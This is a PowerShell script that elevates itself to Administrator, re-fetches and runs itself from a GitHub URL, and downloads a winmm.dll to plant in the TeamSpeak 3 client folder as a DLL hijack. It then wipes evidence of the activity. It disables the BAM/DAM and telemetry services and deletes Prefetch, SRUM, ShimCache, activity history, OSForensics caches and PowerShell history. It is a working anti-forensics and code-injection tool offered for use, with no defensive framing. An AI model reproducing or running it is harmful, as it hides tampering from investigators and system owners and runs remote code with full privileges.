#Requires -Version 5.1
param(
    [string]$DllUrl = 'https://raw.githubusercontent.com/lubyralph6-maker/TS3DLL.PS1/main/winmm.dll',
    [string]$Ts3Path = '',
    [string]$ScriptUrl = 'https://raw.githubusercontent.com/lubyralph6-maker/TS3DLL.PS1/main/TS3DLL.ps1'
)

$ErrorActionPreference = 'SilentlyContinue'

function Write-Step([string]$Text) {
    Write-Host "[TS3DLL] $Text" -ForegroundColor Cyan
}

function Test-IsAdmin {
    $id = [Security.Principal.WindowsIdentity]::GetCurrent()
    $p = New-Object Security.Principal.WindowsPrincipal($id)
    return $p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Ensure-Admin {
    if (Test-IsAdmin) { return }
    Write-Host '[TS3DLL] Requesting Administrator...' -ForegroundColor Yellow
    $dllEsc = $DllUrl.Replace("'", "''")
    $ts3Esc = $Ts3Path.Replace("'", "''")
    $scriptEsc = $ScriptUrl.Replace("'", "''")
    $inner = "`$DllUrl='$dllEsc'; `$Ts3Path='$ts3Esc'; `$ScriptUrl='$scriptEsc'; iex (irm '$scriptEsc')"
    $arg = "-NoProfile -ExecutionPolicy Bypass -Command $inner"
    Start-Process powershell.exe -Verb RunAs -ArgumentList $arg
    exit
}

function Get-Ts3InstallPath {
    if ($Ts3Path -and (Test-Path -LiteralPath $Ts3Path)) {
        return (Resolve-Path -LiteralPath $Ts3Path).Path
    }
    $candidates = @(
        "${env:ProgramFiles}\TeamSpeak 3 Client"
        "${env:ProgramFiles(x86)}\TeamSpeak 3 Client"
    )
    foreach ($p in $candidates) {
        if (Test-Path -LiteralPath $p) { return $p }
    }
    try {
        $reg = Get-ItemProperty -Path 'HKLM:\SOFTWARE\TeamSpeak 3 Client' -ErrorAction Stop
        if ($reg.default -and (Test-Path -LiteralPath $reg.default)) { return $reg.default }
    } catch {}
    return $null
}

function Stop-Ts3Processes {
    foreach ($n in @('ts3client_win64', 'ts3client_win32', 'TeamSpeak')) {
        Get-Process -Name $n -ErrorAction SilentlyContinue | ForEach-Object {
            Write-Step "Stopping $($_.Name)"
            Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
        }
    }
    Start-Sleep -Seconds 2
}

function Stop-TraceServices {
    Write-Step 'Stopping BAM/DAM / telemetry...'
    foreach ($svc in @('bam', 'dam', 'DiagTrack', 'DPS')) {
        try {
            $s = Get-Service -Name $svc -ErrorAction SilentlyContinue
            if ($s -and $s.Status -eq 'Running') {
                Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue
            }
        } catch {}
    }
    Start-Sleep -Milliseconds 500
}

function Disable-BamDam {
    foreach ($svc in @('bam', 'dam')) {
        try {
            Set-Service -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue
            Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$svc" -Name Start -Value 4 -Force -ErrorAction SilentlyContinue
        } catch {}
    }
}

function Clear-BamDamUserSettings {
    Write-Step 'Wiping BAM/DAM...'
    $paths = @(
        'SYSTEM\CurrentControlSet\Services\bam\State\UserSettings'
        'SYSTEM\CurrentControlSet\Services\bam\UserSettings'
        'SYSTEM\CurrentControlSet\Services\bam\DesktopMonitor\UserSettings'
        'SYSTEM\CurrentControlSet\Services\dam\State\UserSettings'
        'SYSTEM\CurrentControlSet\Services\dam\UserSettings'
        'SYSTEM\CurrentControlSet\Services\dam\DesktopMonitor\UserSettings'
    )
    foreach ($rel in $paths) {
        $hive = "HKLM:\$rel"
        if (-not (Test-Path -LiteralPath $hive)) { continue }
        Get-ChildItem -LiteralPath $hive -ErrorAction SilentlyContinue | ForEach-Object {
            try {
                Remove-Item -LiteralPath $_.PSPath -Recurse -Force -ErrorAction Stop
            } catch {
                $sub = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey("$rel\$($_.Name)", $true)
                if ($sub) {
                    foreach ($vn in $sub.GetValueNames()) { try { $sub.DeleteValue($vn, $false) } catch {} }
                    $sub.Close()
                }
            }
        }
    }
}

function Remove-FilesByPattern([string]$Folder, [string[]]$Patterns) {
    if (-not (Test-Path -LiteralPath $Folder)) { return }
    foreach ($pat in $Patterns) {
        Get-ChildItem -LiteralPath $Folder -Filter $pat -File -ErrorAction SilentlyContinue | ForEach-Object {
            try {
                $_.Attributes = 'Normal'
                Remove-Item -LiteralPath $_.FullName -Force -ErrorAction Stop
            } catch {}
        }
    }
}

function Clear-PrefetchTraces {
    $pf = Join-Path $env:SystemRoot 'Prefetch'
    Remove-FilesByPattern $pf @(
        'TEAMSPEAK3*.pf','TS3CLIENT*.pf','TS3CLIENT_WIN64*.pf','TS3CLIENT_WIN32*.pf'
        'WINMM.DLL*.pf','TEAMSPEAK*.pf','LIBRARY64*.pf'
        'CMD.EXE*.pf','CONHOST.EXE*.pf','POWERSHELL*.pf','PWSH*.pf'
    )
}

function Clear-SrumDatabase {
    $sru = Join-Path $env:SystemRoot 'System32\sru'
    Remove-FilesByPattern $sru @('*.dat','*.log','*.chk','*.jfm')
}

function Clear-RecentAndTemp {
    $recent = Join-Path $env:APPDATA 'Microsoft\Windows\Recent'
    Remove-FilesByPattern $recent @('*TeamSpeak*','*TEAMSPEAK*','*winmm.dll*','*WINMM.DLL*','*library64*')
    Remove-FilesByPattern ([System.IO.Path]::GetTempPath()) @('*winmm*','*TeamSpeak*','*TS3DLL*')
    Remove-FilesByPattern (Join-Path $env:LOCALAPPDATA 'Temp') @('*winmm*','*TeamSpeak*','*TS3DLL*')
}

function Clear-ActivitiesCache {
    $cdp = Join-Path $env:LOCALAPPDATA 'ConnectedDevicesPlatform'
    if (-not (Test-Path -LiteralPath $cdp)) { return }
    Get-ChildItem -LiteralPath $cdp -Directory -ErrorAction SilentlyContinue | ForEach-Object {
        foreach ($f in @('ActivitiesCache.db','ActivitiesCache.db-wal','ActivitiesCache.db-shm')) {
            $fp = Join-Path $_.FullName $f
            if (Test-Path -LiteralPath $fp) { try { Remove-Item -LiteralPath $fp -Force } catch {} }
        }
    }
}

function Clear-ShimCache {
    try {
        Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager' -Name AppCompatCache -Force -ErrorAction SilentlyContinue
    } catch {}
}

function Clear-OsForensicsCaches {
    $roots = @(
        "${env:ProgramFiles}\OSForensics"
        "${env:ProgramFiles}\PassMark\OSForensics"
        "$env:LOCALAPPDATA\PassMark\OSForensics"
        "$env:APPDATA\PassMark\OSForensics"
        "$env:LOCALAPPDATA\OSForensics"
        "$env:PROGRAMDATA\PassMark\OSForensics"
    )
    $subfolders = @('Cache','Caches','Index','Indexes','History','Search','SearchHistory','Logs','Recent','Reports','Data','Activity','Timeline','Activities','RecentActivity','CaseData','Cases')
    $patterns = @('*.db','*.idx','*.log','*.sqlite','*TeamSpeak*','*teamspeak*','*TS3*','*winmm*','*library64*','*Activity*','*Timeline*','*Recent*')
    foreach ($root in $roots) {
        if (-not (Test-Path -LiteralPath $root)) { continue }
        foreach ($sub in $subfolders) {
            $p = Join-Path $root $sub
            if (Test-Path -LiteralPath $p) { try { Remove-Item -LiteralPath $p -Recurse -Force } catch {} }
        }
        Remove-FilesByPattern $root $patterns
    }
}

function Clear-PowerShellTraces {
    try { [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() } catch {}
    try { Clear-History -ErrorAction SilentlyContinue } catch {}
    $hist = Join-Path $env:APPDATA 'Microsoft\Windows\PowerShell\PSReadLine'
    if (Test-Path -LiteralPath $hist) {
        Get-ChildItem -LiteralPath $hist -Filter '*history*' -File -ErrorAction SilentlyContinue |
            ForEach-Object { try { Remove-Item -LiteralPath $_.FullName -Force } catch {} }
    }
}

function Invoke-FullTraceClean {
    Stop-TraceServices
    Clear-BamDamUserSettings
    Clear-PrefetchTraces
    Clear-SrumDatabase
    Clear-RecentAndTemp
    Clear-ActivitiesCache
    Clear-ShimCache
    Clear-OsForensicsCaches
    Clear-PowerShellTraces
    Disable-BamDam
    Clear-BamDamUserSettings
    Clear-PrefetchTraces
    Clear-OsForensicsCaches
    Clear-PowerShellTraces
}

function Install-DllToTs3([string]$SourceFile, [string]$TargetDir) {
    $dest = Join-Path $TargetDir 'winmm.dll'
    foreach ($old in @('library64.dll','winmm_sys.dll','Libery64.dll')) {
        $p = Join-Path $TargetDir $old
        if (Test-Path -LiteralPath $p) { try { Remove-Item -LiteralPath $p -Force } catch {} }
    }
    Copy-Item -LiteralPath $SourceFile -Destination $dest -Force
    $size = (Get-Item -LiteralPath $dest).Length
    if ($size -lt 100000) { throw "winmm.dll too small ($size bytes)" }
    Write-Step "Installed: $dest ($size bytes)"
}

Ensure-Admin

Write-Host '========================================' -ForegroundColor Magenta
Write-Host '  TS3DLL Auto Install + Trace Clean' -ForegroundColor Magenta
Write-Host '========================================' -ForegroundColor Magenta

$ts3 = Get-Ts3InstallPath
if (-not $ts3) {
    Write-Host '[ERROR] TeamSpeak 3 not found' -ForegroundColor Red
    exit 1
}

Write-Step "TS3: $ts3"
Stop-Ts3Processes

$tempDll = Join-Path $env:TEMP 'winmm_ts3dll.tmp'
try {
    if (Test-Path -LiteralPath $tempDll) { Remove-Item -LiteralPath $tempDll -Force }
    Write-Step 'Downloading winmm.dll...'
    Invoke-WebRequest -Uri $DllUrl -OutFile $tempDll -UseBasicParsing -TimeoutSec 120
} catch {
    Write-Host '[ERROR] Download failed - upload winmm.dll to GitHub first' -ForegroundColor Red
    exit 1
}

try { Install-DllToTs3 -SourceFile $tempDll -TargetDir $ts3 } catch {
    Write-Host "[ERROR] $($_.Exception.Message)" -ForegroundColor Red
    exit 1
}

try { if (Test-Path -LiteralPath $tempDll) { Remove-Item -LiteralPath $tempDll -Force } } catch {}

Write-Step 'Cleaning traces...'
Invoke-FullTraceClean

Write-Host '========================================' -ForegroundColor Green
Write-Host '  Done! Open TeamSpeak 3 + license key' -ForegroundColor Green
Write-Host '========================================' -ForegroundColor Green
Start-Sleep -Seconds 2
